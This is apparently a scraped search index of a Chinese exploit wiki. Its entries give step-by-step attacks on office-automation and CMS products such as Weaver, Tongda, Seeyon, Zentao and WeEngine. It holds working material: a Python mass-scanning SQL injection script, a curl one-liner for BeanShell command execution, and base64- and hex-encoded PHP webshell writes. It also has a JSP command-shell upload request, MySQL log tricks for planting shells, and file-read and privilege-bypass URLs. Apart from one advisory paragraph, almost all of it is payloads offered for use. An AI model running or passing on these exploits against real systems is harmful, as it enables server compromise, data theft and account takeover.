%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 2、批量脚本 #config=utf-8 import requests,json def fanwei(urls): try: url = urls+\"mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333\" data = \"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 \" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Length\": \"2236\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\":\"1\" } info = requests.post(url,headers=headers,data=data,timeout=30) if info.status_code == 200: json_info = json.loads(info.text) if json_info == []: print(urls+\" 不存在漏洞\") with open(\"no.txt\", 'a') as f: f.write(urls + '\\n') else: print(json_info) print(urls+\" 存在漏洞\") with open(\"ok.txt\", 'a') as f: f.write(urls + '\\n') else: print(urls+\"不存在漏洞\") with open(\"no.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.HTTPError: print(urls+\" --HTTPError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.ConnectionError: print(urls+\" --ConnectionError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.Timeout: print(urls+\" --Timeout\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except json.decoder.JSONDecodeError: print(urls+\" --JSONDecodeError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') fp=open(\"123.txt\") for line in fp: line = line.strip('\\n') fanwei(str(line)) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:41:32 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/3.html":{"url":"0day/泛微oa/3.html","title":"泛微OA管理系统RCE漏洞","keywords":"","body":"泛微OA管理系统RCE漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw' 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-03 17:21:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/12.html":{"url":"0day/通达oa/12.html","title":"通达oa 2011-2013 通杀GETSHELL","keywords":"","body":"通达oa 2011-2013 通杀GETSHELL 一、漏洞简介 二、漏洞影响 2011、2013版本 三、复现过程 第一步: http://0-sec.org/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} 第二步: http://0-sec.org/general/email/index.php SHELL: http://0-sec.org/general/email/shell.php 密码C 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:41:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/2.html":{"url":"0day/通达oa/2.html","title":"（WooYun-2014-82678）通达oa未授权获取帐号","keywords":"","body":"（WooYun-2014-82678）通达oa 未授权获取帐号 一、漏洞简介 无需登录，即可获取所有信息 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/mobile/inc/get_contactlist.php?P=1&KWORD=%&isuser_info=3 http://0-sec.org/mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=50 将返回的json进行解码 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:14:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/3.html":{"url":"0day/通达oa/3.html","title":"通达oa XFF导致日志混淆","keywords":"","body":"通达oa XFF导致日志混淆 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 使用header中的X-Forwarded-For想伪装⾃己的IP地址，你的IP地址会直接进⼊安全审计日志⾥面。很多地方你也可以配置这个来进行XSS盲打，但是此处不存在XSS。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:14:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/4.html":{"url":"0day/通达oa/4.html","title":"通达oa ⻚面敏感信息泄露","keywords":"","body":"通达oa ⻚面敏感信息泄露 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/general/get_userinfo.php http://0-sec.org/general/ipanel/user/query.php http://0-sec.org/general/info/dept/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:23:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/5.html":{"url":"0day/通达oa/5.html","title":"通达oa 任意账号跳转","keywords":"","body":"通达oa 任意账号跳转 一、漏洞简介 需要登录 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/interface/ugo.php?OA_USER=admin 通过控制OA_USER参数进行任意⽤户的跳转，⽐如说你现在是个普通权限的⽤户，使用这个⻚面即可跳转到admin用户下面。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:23:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/6.html":{"url":"0day/通达oa/6.html","title":"通达oa 文件包含漏洞","keywords":"","body":"通达oa 文件包含漏洞 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 poc http://0-sec.org/inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&include_file=../inc/js/menu_left.js 通常情况下，在控制⾯板中上传⼀个jpg头像，然后利用该⻚面的⽂件包含getshell。通达OA网站的根⽬录 一般在D:\\MYOA\\webroot中,头像附件一般在D:\\MYOA\\webroot\\attachment\\avatar\\XXX.jpg 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:25:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/7.html":{"url":"0day/通达oa/7.html","title":"通达oa sql注入","keywords":"","body":"通达oa sql注入 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 poc http://0-sec.org/general/mytable/intel_view/workflow.php?MAX_COUNT=15 procedure analyse(extrac tvalue(rand(),concat(0x3a,database())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55& MODULE_ID=Math.random http://0-sec.org/general/document/index.php/recv/register/turn post(_SERVER=&rid=1') http://0-sec.org/general/document/index.php/recv/register/insert post: title)values(\"'\"^exp(if(1%3d2,1,710)))#=1&_SERVER= 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:29:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/8.html":{"url":"0day/通达oa/8.html","title":"通达oa xss","keywords":"","body":"通达oa xss 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 发邮件的地方、问题问答的地⽅都存在XSS，可获取他人账号权限。⼀般情况下，OA会有前端进行过滤， 所以抓包时候去添加payload，之后会对事件进行过滤，所以使用 poc 这个漏洞获取admin权限⾮常好用。想X谁X谁! 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:32:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/9.html":{"url":"0day/通达oa/9.html","title":"通达oa 越权访问","keywords":"","body":"通达oa 越权访问 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 将get型访问转换成post,并且post参数_SERVER,即可越权访问admin才能访问的⻚面。根据⽹上的通达 OA的源码找这些敏感地址,如: /general/system/database/ 根据源码,几乎所有敏感的⻚面都可以使用这种方式进行越权访问,⽐如说设置⻆色权限的⻚面啊什么的。这个⻚面就已经可以XX了! 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:35:46 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/10.html":{"url":"0day/通达oa/10.html","title":"通达oa 数据库脚本导⼊getshell","keywords":"","body":"通达oa 数据库脚本导⼊getshell 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 ⾥面的database⻚面可以导入sql脚本文件,但是系统过滤了很多,有很多的限制,使⽤mysql日志的方式进行 突破。 set global general_log = on; set global general_log_file = '../webroot/test.php'; select ''; set global general_log = off; 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:36:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/11.html":{"url":"0day/通达oa/11.html","title":"通达oa 任意⽂件上传漏洞","keywords":"","body":"通达oa 任意⽂件上传漏洞 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 EXP: 上传jpg之后shell地址为 http://0-sec.org/general/vmeet/wbUpload/test.php 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 22:39:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/1.html":{"url":"0day/通达oa/1.html","title":"通达oa 11.2后台getshell","keywords":"","body":"通达OA 11.2后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 系统管理-附件管理-添加存储目录 设置存储目录 （一般默认网站安装目录为 D:/MYOA/webroot/ 最后也有路径获取的地方，如果不设置会不在网站根目录下，无法直接访问附件） 寻找附件上传 通过.php. 绕过黑名单上传 根据返回结果拼接上传路径：/im/1912/383971046.test.php 直接访问（im是模块） 最后这有绝对路径的获取 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-04 21:28:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/致远oa/1.html":{"url":"0day/致远oa/1.html","title":"致远oa远程命令执行","keywords":"","body":"标题 致远OA-A8系统远程命令执行漏洞 一、漏洞简介 该系统的漏洞点在于致远OA-A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需认证的情况下实现任意文件上传。攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后门文件，从而获取目标服务器权限，在目标服务器上执行任意代码。 二、漏洞影响 漏洞影响的产品版本包括： 致远A8-V5协同管理软件 V6.1sp1 致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3 致远A8+协同管理软件V7.1 漏洞处置建议 = 临时修补方案如下： 1、 配置URL访问控制策略； 2、 在公网部署的致远A8+服务器，通过ACL禁止外网对“/seeyon/htmlofficeservlet”路径的访问； 3、 对OA服务器上的网站后门文件进行及时查杀。 建议使用致远OA-A8系统的信息系统运营者进行自查，发现存在漏洞后，按照以上方案及时修复。 详情请移步CNVD官网查看https://www.cnvd.org.cn/webinfo/show/5095 三、复现过程 先访问/seeyon/htmlofficeservlet 出现DBSTEP V3.0 0 21 0 htmoffice operate err 掏出burp进行抓包替换成poc如下 提交POST请求包，查看回显如下 小结 POC：(POST包) POST /seeyon/htmlofficeservlet HTTP/1.1 Content-Length: 1121 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Host: xxxxxxxxx Pragma: no-cache DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 \"+excuteCmd(request.getParameter(\"cmd\")) + \"\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 19:52:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅知/1.html":{"url":"0day/禅知/1.html","title":"禅知Pro 1.6 前台任意文件读取","keywords":"","body":"禅知Pro 1.6 前台任意文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 在网站根目录C:\\xampp\\chanzhi\\www新建一个测试文件test.php 执行payload查看文件内容： http://0-sec.org/file.php?pathname=../test.phpi&t=txt&o=source 执行payload来查看程序的配置文件： http://0-sec.org/file.php?pathname=../http.ini&t=txt&o=source 跨目录读取文件（前提是有目录权限）： http://0-sec.org/file.php?pathname=../../bin/php/backup.php&t=txt&o=source 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 18:09:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅知/2.html":{"url":"0day/禅知/2.html","title":"禅知后台getshell","keywords":"","body":"禅知后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 后台存在模板编辑，但是如果保存的话需要创建一个/system\\tmp\\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就 在/system/module/wechat/model.php $qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径 POST /chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: http://localhost/chanzhieps/www/admin.php?m=wechat&f=edit&publicID=1 Content-Length: 120 Cookie: adminsid=ae8tu3s80j8cfvh2hkgu41bbig; adminLang=zh-cn; adminDevice=desktop; theme=default; currentGroup=setting; frontsid=eaa0tdicbqfq0lurm89t3n9fvn; frontLang=zh-cn; frontDevice=desktop X-Forwarded-For: 8.8.8.8 Connection: close type=subscribe&name=123&account=..%2F..%2F..%2Fsystem%5Ctmp%5Cxjrg.txt%5C1&appID=789&appSecret=100&token=222&certified=0 点一下二维码，再随便传一张图片，可以看到创建了一个xjrg.txt文件夹 现在我们再去编辑模板，{!echo(system('ipconfig'))},可以直接写入一句话 然后在访问前台 http:/0-sec.org/chanzhieps/www/index.php/sitemap/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-30 20:44:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/禅道/1.html":{"url":"0day/禅道/1.html","title":"禅道8.2-9.2.1注入GetShell","keywords":"","body":"禅道8.2-9.2.1注入GetShell 一、漏洞简介 二、漏洞影响 三、复现过程 我这里用的官方集成环境版本8.4 获取版本号：/index.php?mode=getconfig 绝对路径 获取绝对路径：网址后面随便输入什么就会爆出绝对路径 没路径的报错exp： {\"orderBy\":\"order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= EXP 提交地址：http://127.0.0.1:81/zentao/index.php?m=block&f=main&mode=getblockdata&blockid=case&param=base64 ※exp需要base64加密后才能提交，且回显、写Shell须加上Referer：http://127.0.0.1:81/zentao/ 注入显密码： {\"orderBy\":\"order limit 1;#\",\"num\":\"1,1\",\"type\":\"openedbyme\"} base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTsjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 不知道什么原因，本地复现无账号密码回显。。。 前台GetShell： {\"orderBy\":\"order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -\",\"num\":\"1,1\",\"type\":\"openedbyme\"} 其中有部分使用了MySQL的预处理查询绕过程序的过滤： 导出shell： select '' into outfile 'D:/zentao/xampp/zentao/www/hack.php' HEX编码：（注意加密解密都不带0x，但是EXP中需要加上） 73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027 base64加密： eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== 访问之即可在目录下生成hack.php： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 21:57:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/1.html":{"url":"0day/微擎/1.html","title":"微擎 绕过禁用函数写shell","keywords":"","body":"微擎 绕过禁用函数写shell 一、漏洞简介 二、漏洞影响 三、复现过程 1.站点设置里面打开调试 2.执行语句 select into被禁止 3.利用日志文件写shell show variables like '%general%'; #查看配置 set global general_log = on; #开启general log模式 set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址 select '' #写入shell 4.SQL查询免杀shell的语句 SELECT \"'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$ 补充:来自土司@GuoKerSb的分享 在无法修改general_log_file指向的地址且网站用户量多时刻处于查询的状态，我们还可以通过启动slow_query_log（慢查询日志，默认关闭）来写shell set global slow_query_log=1; set global slow_query_log_file='/var/www/html/1.php'; select '' or sleep(11); 四、参考链接 https://www.vulnbug.com/Exploit/Microcomputer-CMS-bypasses-disabled-Intooutfile-and-safe-dog.html 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 01:08:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/2.html":{"url":"0day/微擎/2.html","title":"微擎 后台getshell","keywords":"","body":"微擎 后台getshell 一、漏洞简介 二、漏洞影响 v1.8.2（201812130002） 三、复现过程 站点-附件设置-支持文件后缀 在安装完成的时候,数据库里面并没有写入支持文件后缀的值,需要我们进行添加需要的脚本格式php等等 直接写上支持的后缀为php是会带入到数据库的,提交完毕以后数据库会显示可上传的值 a:3:{s:16:\"attachment_limit\"; i:0;s:5:\"image\";a:5:{s:5:\"thumb\";i:0;s:5: \"width\";i:800;s:10:\"extentions\"; a:4:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"png\";} s:5:\"limit\";i:5000;s:14:\"zip_percentage\";s:3:\"100\";} s:5:\"audio\";a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 漏洞利用 写入任意字符 a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"aaa\";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\"; a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 站点-常用工具-数据库-执行SQL语句替换之前插入的值 (记得打开调试模式) UPDATE ims_core_settings SET value = replace(value, 'aaa', 'php ') 注意php后有一个空格 or 如果在渗透过程中有SQL注入点的情况下 有用户权限能够上传,尝试直接在SQLMAP执行语句 UPDATE `ims_core_settings` SET `key` = 'upload', `value` = 'a:2:{s:5:\\\"image\\\";a:4:{s:5:\\\"thumb\\\";i:0; s:5:\\\"width\\\";i:800;s:10:\\\"extentions\\\"; a:5:{i:0;s:3:\\\"gif\\\";i:1;s:3:\\\"jpg\\\";i:2; s:4:\\\"jpeg\\\";i:3; s:3:\\\"png\\\";i:4;s:3:\\\"php \\\";} s:5:\\\"limit\\\";i:5000;}s:5:\\\"audio\\\"; a:2:{s:10:\\\"extentions\\\";a:1:{i:0;s:3:\\\"mp3\\\";}s:5:\\\"limit\\\";i:5000;}}' WHERE `key` = 'upload' AND `key` = 'upload' COLLATE utf8mb4_bin; a:3:{s:16:\"attachment_limit\";i:0;s:5:\"image\"; a:5:{s:5:\"thumb\";i:0;s:5:\"width\";i:800;s:10:\"extentions\"; a:5:{i:0;s:3:\"gif\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3; s:3:\"png\";i:4;s:3:\"php \";}s:5:\"limit\";i:5000; s:14:\"zip_percentage\";s:3:\"100\";}s:5:\"audio\"; a:2:{s:10:\"extentions\";a:1:{i:0;s:3:\"mp3\";}s:5:\"limit\";i:5000;}} 执行完毕-系统-更新缓存 上传php文件 以上全部操作完毕,直接在可以上传图片的地方进行上传脚本 四、参考链接 https://www.vulnbug.com/Exploit/getshell-vulnerability-in-microcomputer-cms-background.html 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 01:08:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/微擎/3.html":{"url":"0day/微擎/3.html","title":"微擎 低权限后台getshell","keywords":"","body":"微擎 低权限后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 /web/index.php?c=site&a=editor 这个文件可以编辑html，然后前台会解析成php 没测试最新版 比如编辑专题：/web/index.php?c=site&a=editor&do=page&multiid=0 上架抓包 改html内容为php 复制前台url 访问之 四、参考链接 https://www.t00ls.net/viewthread.php?tid=54258&extra=&page=1 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 01:01:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"提权EXP/1.html":{"url":"提权EXP/1.html","title":"零组提权EXP自动更新脚本","keywords":"","body":"零组提权EXP更新脚本 下载地址 简介 零组基于Python开发的一款自动更新LINUX和Windows提权EXP脚本。 脚本支持Python2和3以及Windows和Linux，需要安装requests模块，使用命令:pip install requests 建议和BUG反馈，请加群交流群：793247367 脚本使用截图: windows Linux 